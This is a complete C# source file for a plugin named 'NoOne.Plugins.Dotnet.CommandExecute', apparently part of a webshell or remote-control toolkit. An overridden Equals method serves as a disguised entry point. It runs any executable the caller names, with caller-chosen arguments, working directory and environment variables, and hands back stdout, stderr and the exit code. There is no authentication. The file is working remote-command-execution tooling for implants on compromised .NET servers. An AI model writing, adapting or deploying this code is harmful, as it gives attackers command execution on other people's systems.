using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace NoOne.Plugins.Dotnet.CommandExecute
{
    public sealed class DotnetCommandExecutePlugin
    {
        public override bool Equals(object obj)
        {
            IDictionary<string, object> ctx = obj as IDictionary<string, object>;
            if (ctx == null)
            {
                return true;
            }

            Dictionary<string, object> result = new Dictionary<string, object>();
            try
            {
                string op = GetTrimString(ctx, "op");
                if (string.IsNullOrEmpty(op))
                {
                    result["error"] = "op is required";
                    ctx["result"] = result;
                    return true;
                }

                string cwd = NormalizeCwd(GetTrimString(ctx, "cwd"));
                string charsetName = GetTrimString(ctx, "charset");
                Encoding charset = ResolveCharset(charsetName);
                result["cwd"] = cwd;
                result["charsetUsed"] = charset.WebName;

                if (op == "cd")
                {
                    string cdTarget = GetTrimString(ctx, "cdTarget");
                    string nextCwd = ResolveCdTarget(cwd, cdTarget);
                    result["stdout"] = "";
                    result["stderr"] = "";
                    result["exitCode"] = 0;
                    result["cwd"] = nextCwd;
                    ctx["result"] = result;
                    return true;
                }

                if (op != "exec")
                {
                    result["error"] = "unsupported op: " + op;
                    ctx["result"] = result;
                    return true;
                }

                string executable = GetTrimString(ctx, "executable");
                if (string.IsNullOrEmpty(executable))
                {
                    result["error"] = "executable is required";
                    ctx["result"] = result;
                    return true;
                }

                List<string> argv = ToStringList(ctx, "argv");

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = executable;
                psi.Arguments = BuildArguments(argv);
                psi.WorkingDirectory = cwd;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.RedirectStandardInput = false;
                psi.CreateNoWindow = true;

                ApplyEnv(psi, ctx);

                Process process = Process.Start(psi);
                byte[] stdoutBytes = ReadAllBytes(process.StandardOutput.BaseStream);
                byte[] stderrBytes = ReadAllBytes(process.StandardError.BaseStream);
                process.WaitForExit();

                result["stdout"] = charset.GetString(stdoutBytes);
                result["stderr"] = charset.GetString(stderrBytes);
                result["exitCode"] = process.ExitCode;
            }
            catch (Exception ex)
            {
                result["error"] = "Command execution failed: " + SafeMessage(ex);
            }

            ctx["result"] = result;
            return true;
        }

        public override int GetHashCode()
        {
            return 0;
        }

        private static string GetTrimString(IDictionary<string, object> ctx, string key)
        {
            object value;
            if (!ctx.TryGetValue(key, out value) || value == null)
            {
                return null;
            }
            string text = value.ToString().Trim();
            return text.Length == 0 ? null : text;
        }

        private static string NormalizeCwd(string rawCwd)
        {
            if (string.IsNullOrEmpty(rawCwd))
            {
                return Directory.GetCurrentDirectory();
            }
            if (!Path.IsPathRooted(rawCwd))
            {
                rawCwd = Path.Combine(Directory.GetCurrentDirectory(), rawCwd);
            }
            return NormalizePath(rawCwd);
        }

        private static string ResolveCdTarget(string currentCwd, string rawTarget)
        {
            string target = string.IsNullOrEmpty(rawTarget) ? "~" : StripPairQuote(rawTarget.Trim());
            if (string.IsNullOrEmpty(target) || target == "~")
            {
                return NormalizePath(GetUserHome());
            }
            if (target.StartsWith("~/") || target.StartsWith("~\\"))
            {
                target = Path.Combine(GetUserHome(), target.Substring(2));
            }

            string resolved = Path.IsPathRooted(target) ? target : Path.Combine(currentCwd, target);
            string normalized = NormalizePath(resolved);

            if (!Directory.Exists(normalized))
            {
                throw new ArgumentException("Directory does not exist: " + normalized);
            }
            return normalized;
        }

        private static string StripPairQuote(string value)
        {
            if (value == null || value.Length < 2)
            {
                return value;
            }
            char first = value[0];
            char last = value[value.Length - 1];
            if ((first == '"' && last == '"') || (first == '\'' && last == '\''))
            {
                return value.Substring(1, value.Length - 2);
            }
            return value;
        }

        private static string NormalizePath(string path)
        {
            try
            {
                return Path.GetFullPath(path);
            }
            catch
            {
                return path;
            }
        }

        private static string GetUserHome()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            if (!string.IsNullOrEmpty(path))
            {
                return path;
            }
            string home = Environment.GetEnvironmentVariable("HOME");
            if (!string.IsNullOrEmpty(home))
            {
                return home;
            }
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
            return string.IsNullOrEmpty(userProfile) ? Directory.GetCurrentDirectory() : userProfile;
        }

        private static Encoding ResolveCharset(string charsetName)
        {
            if (string.IsNullOrEmpty(charsetName))
            {
                return Encoding.UTF8;
            }
            try
            {
                return Encoding.GetEncoding(charsetName);
            }
            catch
            {
                return Encoding.UTF8;
            }
        }

        private static List<string> ToStringList(IDictionary<string, object> ctx, string key)
        {
            List<string> list = new List<string>();
            object value;
            if (!ctx.TryGetValue(key, out value) || value == null)
            {
                return list;
            }
            IEnumerable enumerable = value as IEnumerable;
            if (enumerable != null && !(value is string))
            {
                foreach (object item in enumerable)
                {
                    if (item != null)
                    {
                        list.Add(item.ToString());
                    }
                }
            }
            else
            {
                list.Add(value.ToString());
            }
            return list;
        }

        private static string BuildArguments(List<string> argv)
        {
            if (argv.Count == 0)
            {
                return "";
            }
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < argv.Count; i++)
            {
                if (i > 0)
                {
                    sb.Append(' ');
                }
                string arg = argv[i];
                if (arg.Length == 0 || arg.IndexOf(' ') >= 0 || arg.IndexOf('"') >= 0)
                {
                    sb.Append('"');
                    sb.Append(arg.Replace("\\", "\\\\").Replace("\"", "\\\""));
                    sb.Append('"');
                }
                else
                {
                    sb.Append(arg);
                }
            }
            return sb.ToString();
        }

        private static void ApplyEnv(ProcessStartInfo psi, IDictionary<string, object> ctx)
        {
            object rawEnv;
            if (!ctx.TryGetValue("env", out rawEnv) || rawEnv == null)
            {
                return;
            }
            IDictionary<string, object> envMap = rawEnv as IDictionary<string, object>;
            if (envMap == null)
            {
                return;
            }
            foreach (KeyValuePair<string, object> entry in envMap)
            {
                if (string.IsNullOrEmpty(entry.Key) || entry.Value == null)
                {
                    continue;
                }
                string key = entry.Key.Trim();
                if (key.Length > 0)
                {
                    psi.EnvironmentVariables[key] = entry.Value.ToString();
                }
            }
        }

        private static byte[] ReadAllBytes(Stream stream)
        {
            MemoryStream ms = new MemoryStream();
            byte[] buffer = new byte[4096];
            int read;
            while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)
            {
                ms.Write(buffer, 0, read);
            }
            return ms.ToArray();
        }

        private static string SafeMessage(Exception ex)
        {
            if (ex == null)
            {
                return "unknown error";
            }
            string message = ex.Message;
            if (string.IsNullOrEmpty(message))
            {
                return ex.GetType().Name;
            }
            return message;
        }
    }
}
